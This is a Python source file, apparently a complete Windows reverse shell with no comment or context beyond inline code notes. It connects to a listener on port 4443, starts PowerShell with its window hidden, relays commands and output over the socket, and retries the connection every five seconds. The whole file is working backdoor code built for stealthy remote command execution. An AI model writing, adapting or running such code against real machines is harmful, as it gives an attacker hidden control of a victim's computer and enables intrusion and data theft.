import socket, subprocess, threading, time, os
from typing import BinaryIO, cast

def connect():
    while True:
        try:
            # Connect to listener
            s = socket.socket()
            s.connect(('127.0.0.1', 4443))
            
            # Start PS hidden with no window creation flags
            p = subprocess.Popen(
                ['powershell.exe', '-WindowStyle', 'Hidden', '-NoProfile'],
                stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                creationflags=0x08000000
            )

            # Function to forward output from subprocess to socket
            def pipe_output(pipe: BinaryIO | None):
                if pipe is not None:
                    while True:
                        try:
                            data = pipe.read(1)
                            if not data:
                                break
                            s.sendall(data)
                        except (OSError, socket.error):
                            break
            
            # Use local variables and cast to satisfy static analysis
            stdout_pipe = cast(BinaryIO, p.stdout)
            stderr_pipe = cast(BinaryIO, p.stderr)
            stdin_pipe = cast(BinaryIO, p.stdin)

            # Start threads for stdout and stderr
            threading.Thread(target=pipe_output, args=(stdout_pipe,), daemon=True).start()
            threading.Thread(target=pipe_output, args=(stderr_pipe,), daemon=True).start()

            # Forward input from socket to subprocess
            if stdin_pipe is not None:
                while True:
                    try:
                        data = s.recv(1024)
                        if not data:
                            break
                        stdin_pipe.write(data)
                        stdin_pipe.flush()
                    except (OSError, socket.error):
                        break
                
            s.close()
            p.terminate()
        except Exception:
            # Retry connection after delay
            time.sleep(5)

if __name__ == "__main__":
    connect()

